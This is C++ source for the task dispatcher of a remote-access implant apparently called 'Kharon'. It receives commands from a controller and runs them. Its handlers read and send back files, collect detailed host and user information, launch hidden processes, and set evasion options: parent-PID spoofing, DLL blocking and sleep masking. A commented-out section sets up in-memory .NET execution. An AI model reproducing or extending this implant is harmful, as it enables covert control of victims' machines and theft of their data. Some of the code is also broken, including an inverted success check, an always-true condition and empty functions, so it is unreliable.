#include <Kharon.h>

using namespace Root;

auto DECLFN Task::Dispatcher(
    VOID
) -> VOID {
    PPACKAGE Package = Kh->Pkg->NewTask();
    PPARSER  Parser  = (PPARSER)Kh->Hp->Alloc( sizeof( PARSER ) );

    ULONG TaskCode = 0;
    INT16 TaskID   = 0;
    BYTE  JobID    = 0;
    BOOL  TaskBool = FALSE;
    ULONG TaskQtt  = 0;

    PBYTE Buffer = NULL;
    ULONG Length = 0;

    PVOID  DataPsr = NULL;
    SIZE_T PsrLen  = 0;

    Kh->Pkg->AddInt32( Package, Kh->Job.Qtt );

    KhDbg( "send %p [%d bytes]", Package->Buffer, Package->Length );

    Kh->Pkg->Transmit( Package, &DataPsr, &PsrLen );
    if ( !DataPsr || !PsrLen ) return;

    Kh->Psr->NewTask( Parser, DataPsr, PsrLen );
    if ( !Parser->Original ) return;

    KhDbg( "parsed %p [%d bytes]", Parser->Buffer, Parser->Length );

    JobID = Kh->Psr->GetByte( Parser );

    KhDbg( "job id: %d", JobID );

    if ( JobID == KhGetTask ) {
        TaskQtt = Kh->Psr->GetInt32( Parser );

        KhDbg( "task quantity: %d", TaskQtt );

        for ( INT i = 0; i < TaskQtt; i++ ) {
            TaskID = Kh->Psr->GetInt16( Parser );

            KhDbg( "task id: %d", TaskID );

            for ( INT i = 0; i < TSK_LENGTH; i++ ) {
                if ( Mgmt[i].ID == TaskID ) {
                    KhDbg( "found task id: %d", Mgmt[i].ID );

                    if ( !Mgmt[i].Run ) return;

                    TaskCode = ( this->*Mgmt[i].Run )( Parser );
                    KhDbg( "task code: %d", TaskCode );

                    if ( TaskCode != ERROR_SUCCESS ) {
                        KhDbg( "task succefully executed" );
                    } else {
                        Kh->Pkg->Error( TaskCode );
                        KhDbg( "task failure in execution" );
                    }
                }
            }
        }
    }

    if ( Parser ) {
        Kh->Psr->Destroy( Parser );
        Kh->Hp->Free( Parser, sizeof( PARSER ) );
    } 

    return;
}

auto DECLFN Task::Injection(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    PPACKAGE Package = Kh->Pkg->Create( TkInjection, Parser );
    UINT8    TypeInj = Kh->Psr->GetByte( Parser );

    return KhRetError( KH_ERROR_INVALID_INJECTION_ID );
}

auto DECLFN Task::FileSystem(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    PPACKAGE Package = Kh->Pkg->Create( TkFileSystem, Parser );
    UINT8    FsSbID  = Kh->Psr->GetByte( Parser );
    ULONG    TmpVal  = 0;
    BOOL     Success = TRUE;
    PBYTE    Buffer  = { 0 };

    KhDbg( "sub command id: %d", FsSbID );

    Kh->Pkg->AddByte( Package, FsSbID );
    
    switch ( FsSbID ) {
        case SbFsList: {
            WIN32_FIND_DATAA FindData     = { 0 };
            SYSTEMTIME       CreationTime = { 0 };
            SYSTEMTIME       AccessTime   = { 0 };
            SYSTEMTIME       WriteTime    = { 0 };

            HANDLE FileHandle = NULL;
            ULONG  FileSize   = 0;
            PCHAR  TargetDir  = Kh->Psr->GetStr( Parser, &TmpVal );
            HANDLE FindHandle = Kh->Krnl32.FindFirstFileA( TargetDir, &FindData );

            if ( FindHandle == INVALID_HANDLE_VALUE || !FindHandle ) break;
        
            do {
                FileHandle = Kh->Krnl32.CreateFileA( FindData.cFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
                FileSize   = Kh->Krnl32.GetFileSize( FileHandle, 0 );
                
                Kh->Ntdll.NtClose( FileHandle );

                Kh->Pkg->AddString( Package, FindData.cFileName );

                Kh->Pkg->AddInt32( Package, FileSize );

                Kh->Pkg->AddInt32( Package, FindData.dwFileAttributes );
        
                Kh->Krnl32.FileTimeToSystemTime( &FindData.ftCreationTime, &CreationTime );

                Kh->Pkg->AddInt16( Package, CreationTime.wDay    );
                Kh->Pkg->AddInt16( Package, CreationTime.wMonth  );
                Kh->Pkg->AddInt16( Package, CreationTime.wYear   );
                Kh->Pkg->AddInt16( Package, CreationTime.wHour   );
                Kh->Pkg->AddInt16( Package, CreationTime.wMinute );
                Kh->Pkg->AddInt16( Package, CreationTime.wSecond );
                    
                Kh->Krnl32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &AccessTime );

                Kh->Pkg->AddInt16( Package, AccessTime.wDay    );
                Kh->Pkg->AddInt16( Package, AccessTime.wMonth  );
                Kh->Pkg->AddInt16( Package, AccessTime.wYear   );
                Kh->Pkg->AddInt16( Package, AccessTime.wHour   );
                Kh->Pkg->AddInt16( Package, AccessTime.wMinute );
                Kh->Pkg->AddInt16( Package, AccessTime.wSecond );
                    
                Kh->Krnl32.FileTimeToSystemTime( &FindData.ftLastWriteTime, &WriteTime );

                Kh->Pkg->AddInt16( Package, WriteTime.wDay    );
                Kh->Pkg->AddInt16( Package, WriteTime.wMonth  );
                Kh->Pkg->AddInt16( Package, WriteTime.wYear   );
                Kh->Pkg->AddInt16( Package, WriteTime.wHour   );
                Kh->Pkg->AddInt16( Package, WriteTime.wMinute );
                Kh->Pkg->AddInt16( Package, WriteTime.wSecond );
        
            } while ( Kh->Krnl32.FindNextFileA( FindHandle, &FindData ));
        
            Success = Kh->Krnl32.FindClose( FindHandle );

            break;
        }
        case SbFsCwd: {
            CHAR CurDir[MAX_PATH] = { 0 };

            Kh->Krnl32.GetCurrentDirectoryA( sizeof( CurDir ), CurDir ); 

            Kh->Pkg->AddString( Package, CurDir );

            break;
        }
        case SbFsMove: {
            PCHAR SrcFile = Kh->Psr->GetStr( Parser, 0 );
            PCHAR DstFile = Kh->Psr->GetStr( Parser, 0 );

            Success = Kh->Krnl32.MoveFileA( SrcFile, DstFile ); 

            break;
        }
        case SbFsCopy: {
            PCHAR SrcFile = Kh->Psr->GetStr( Parser, 0 );
            PCHAR DstFile = Kh->Psr->GetStr( Parser, 0 );

            Success = Kh->Krnl32.CopyFileA( SrcFile, DstFile, TRUE );

            break;
        }
        case SbFsMakeDir: {
            PCHAR PathName = Kh->Psr->GetStr( Parser, 0 );

            Success = Kh->Krnl32.CreateDirectoryA( PathName, 0 );
            
            break;
        }
        case SbFsDelete: {
            PCHAR PathName = Kh->Psr->GetStr( Parser, 0 );

            Success = Kh->Krnl32.DeleteFileA( PathName );

            break;
        }
        case SbFsChangeDir: {
            PCHAR PathName = Kh->Psr->GetStr( Parser, 0 );

            Success = Kh->Krnl32.SetCurrentDirectoryA( PathName );

            break;
        }
        case SbFsRead: {
            PCHAR  PathName   = Kh->Psr->GetStr( Parser, 0 );
            ULONG  FileSize   = 0;
            PBYTE  FileBuffer = { 0 };
            HANDLE FileHandle = Kh->Krnl32.CreateFileA( PathName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

            FileSize   = Kh->Krnl32.GetFileSize( FileHandle, 0 );
            FileBuffer = B_PTR( Kh->Hp->Alloc( FileSize ) );

            Success = Kh->Krnl32.ReadFile( FileHandle, FileBuffer, FileSize, &TmpVal, 0 );

            Buffer = FileBuffer;
            TmpVal = FileSize; 

            break;
        }
    }

_KH_END:
    if ( !Success ) { return KhGetError(); }
    if ( FsSbID != SbFsList || FsSbID != SbFsRead ) {
        Kh->Pkg->AddInt32( Package, Success );
    }

    Kh->Pkg->Transmit( Package, 0, 0 );

    if ( Buffer ) { Kh->Hp->Free( Buffer, TmpVal ); }

    return KhRetSuccess;
}

auto DECLFN Task::SelfDelete(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    
}

auto DECLFN Task::Dotnet(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    // PBYTE AssemblyBytes = { 0 };
    // ULONG AssemblySize  = 0;

    // PWSTR AppDomainName = NULL;
    // PWSTR Arguments     = NULL;

    // PCHAR OutBuffer = NULL;
    // ULONG OutLength = 0;

    // BOOL             IsLoadable   = FALSE;
    // HRESULT          HResult      = 0;
    // _AppDomain*      AppDomainRet = { 0 };
    // IUnknown*        AppDomainTk  = { 0 };
    // IEnumUnknown*    EnumUnknown  = { 0 };
    // ICLRMetaHost*    MetaHost     = { 0 };
    // ICLRRuntimeInfo* RuntimeInfo  = { 0 };
    // ICorRuntimeHost* RuntimeHost  = { 0 };

    // HResult = CLRCreateInstance( CLSID_CLRMetaHost, IID_ICLRMetaHost, (PVOID*)&MetaHost );
    // KhDbg( "create clr instance %lx", HResult );
    // if ( !HResult ) return 0;

    // HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUnknown );
    // KhDbg( "enum installed runtimes %lx", HResult );
    // if ( !HResult ) return 0;

    // HResult = MetaHost->GetRuntime( L"v4.0.30319", IID_ICLRRuntimeInfo, (PVOID*)&RuntimeInfo );
    // KhDbg( "get runtime %lx", HResult );
    // if ( !HResult ) return 0;

    // HResult = RuntimeInfo->IsLoadable( &IsLoadable );
    // KhDbg( "is loadable: %s", IsLoadable ? "TRUE" : "FALSE" );
    // if ( !HResult || !IsLoadable ) return 0;

    // HResult = RuntimeInfo->GetInterface( CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (PVOID*)&RuntimeHost );
    // KhDbg( "get interface %lx", HResult );
    // if ( !HResult ) return 0;

    // HResult = RuntimeHost->Start();

    // RuntimeHost->CreateDomain( AppDomainName, 0, &AppDomainTk );

    // AppDomainTk->QueryInterface( IID_PPV_ARGS( &AppDomainRet ) );

    
}

auto DECLFN Task::GetInfo(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    PPACKAGE Package = Kh->Pkg->Create( TkGetInfo, Parser );

    Kh->Pkg->AddString( Package, Kh->Session.AgentID     );
    Kh->Pkg->AddInt32(  Package, Kh->Session.Base.Start  );
    Kh->Pkg->AddInt32(  Package, Kh->Session.Base.Length );
    Kh->Pkg->AddString( Package, Kh->Session.ImageName   );
    Kh->Pkg->AddString( Package, Kh->Session.ImagePath   );
    Kh->Pkg->AddString( Package, Kh->Session.CommandLine );
    Kh->Pkg->AddInt32(  Package, Kh->Session.ProcessID   );
    Kh->Pkg->AddInt32(  Package, Kh->Session.ThreadID    );
    Kh->Pkg->AddInt32(  Package, Kh->Session.ParentID    );
    Kh->Pkg->AddInt32(  Package, Kh->Session.HeapHandle  );
    Kh->Pkg->AddInt32(  Package, Kh->Session.SleepTime   );
    Kh->Pkg->AddInt32(  Package, Kh->Session.ProcessArch );
    Kh->Pkg->AddByte(   Package, Kh->Session.Elevated    );

    Kh->Pkg->AddByte(   Package, Kh->Mask.TechniqueID      );
    Kh->Pkg->AddByte(   Package, Kh->Mask.Heap             );
    Kh->Pkg->AddInt32(  Package, Kh->Mask.JmpGadget        );
    Kh->Pkg->AddInt32(  Package, Kh->Mask.NtContinueGadget );

    Kh->Pkg->AddString( Package, Kh->Machine.UserName      );
    Kh->Pkg->AddString( Package, Kh->Machine.CompName      );
    Kh->Pkg->AddString( Package, Kh->Machine.DomName       );
    Kh->Pkg->AddString( Package, Kh->Machine.NetBios       );
    Kh->Pkg->AddInt32(  Package, Kh->Machine.OsArch        );
    Kh->Pkg->AddInt32(  Package, Kh->Machine.OsMjrV        );
    Kh->Pkg->AddInt32(  Package, Kh->Machine.OsMnrV        );
    Kh->Pkg->AddInt32(  Package, Kh->Machine.OsBuild       );
    Kh->Pkg->AddInt32(  Package, Kh->Machine.ProductType   );
    Kh->Pkg->AddInt32(  Package, Kh->Machine.TotalRAM      );
    Kh->Pkg->AddInt32(  Package, Kh->Machine.AvalRAM       );
    Kh->Pkg->AddInt32(  Package, Kh->Machine.UsedRAM       );
    Kh->Pkg->AddInt32(  Package, Kh->Machine.PercentRAM    );
    Kh->Pkg->AddString( Package, Kh->Machine.ProcessorName );
    Kh->Pkg->AddInt32(  Package, Kh->Machine.ProcessorsNbr );
    
    Kh->Pkg->Transmit( Package, 0, 0 );

    KhRetSuccess;
}

auto DECLFN Task::Config(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    PPACKAGE Package     = Kh->Pkg->Create( TkConfig, Parser );
    UINT8    SbCommandID = Kh->Psr->GetByte( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    switch ( SbCommandID ) {
        case SbCfgPpid: {
            ULONG ParentID = Kh->Psr->GetInt32( Parser );
            Kh->PsCtx.ParentID = ParentID;

            KhDbg( "parent ID set to %d\n", Kh->PsCtx.ParentID ); break;
        }
        case SbCfgBlockDlls: {
            BOOL BlockDlls  = Kh->Psr->GetByte( Parser );
            Kh->PsCtx.BlockDlls = BlockDlls;
            
            KhDbg( "block non microsoft dlls is %s\n", Kh->PsCtx.BlockDlls ? "enabled" : "disabled" ); break;
        }
        case SbCfgCurDir: {
            if ( Kh->PsCtx.CurrentDir ) {
                Kh->Hp->Free( Kh->PsCtx.CurrentDir, Str::LengthA( Kh->PsCtx.CurrentDir ) );
            }

            PCHAR CurDirTmp  = Kh->Psr->GetStr( Parser, &TmpVal );
            PCHAR CurrentDir = (PCHAR)Kh->Hp->Alloc( TmpVal );

            Mem::Copy( CurrentDir, CurDirTmp, TmpVal );

            Kh->PsCtx.CurrentDir = CurrentDir; break;
        }
        case SbCfgMask: {
            UINT8 TechniqueID = Kh->Psr->GetByte( Parser );
            if ( !TechniqueID ) {
                KhDbg( "invalid mask id" );
                return KH_ERROR_INVALID_MASK_ID;
            }
        
            Kh->Mask.TechniqueID = TechniqueID;
        
            KhDbg( 
                "mask technique id set to %d (%s)", Kh->Mask.TechniqueID, 
                Kh->Mask.TechniqueID == MaskTimer ? "timer" : 
                ( Kh->Mask.TechniqueID == MaskApc   ? "apc" : 
                ( Kh->Mask.TechniqueID == MaskWait  ? "wait" : "unknown" ) )
            );
        }
    }
}

auto DECLFN Task::Process(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    PPACKAGE Package     = Kh->Pkg->Create( TkProcess, Parser );
    UINT8    SbCommandID = Kh->Psr->GetByte( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    KhDbg( "sub command id: %d", SbCommandID );

    switch ( SbCommandID ) {
        case SbPsCreate: {
            PCHAR               CommandLine = Kh->Psr->GetStr( Parser, &TmpVal );
            PROCESS_INFORMATION PsInfo      = { 0 };

            Success = Kh->Ps->Create( Package, CommandLine, CREATE_NO_WINDOW, &PsInfo );
            if ( !Success ) return KhGetError();

            Kh->Pkg->AddInt32( Package, PsInfo.dwProcessId );
            Kh->Pkg->AddInt32( Package, PsInfo.dwThreadId  );
            
            break;
        }
        case SbPsList: {
            break;
        }
    } 

    KhRetSuccess;
}

auto DECLFN Task::Exit(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    INT8 ExitType = Kh->Psr->GetByte( Parser );

    if ( ExitType == SbExitProcess ) {
        Kh->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
    } else if ( ExitType == SbExitThread ) {
        Kh->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
    }

    return KhRetSuccess;
}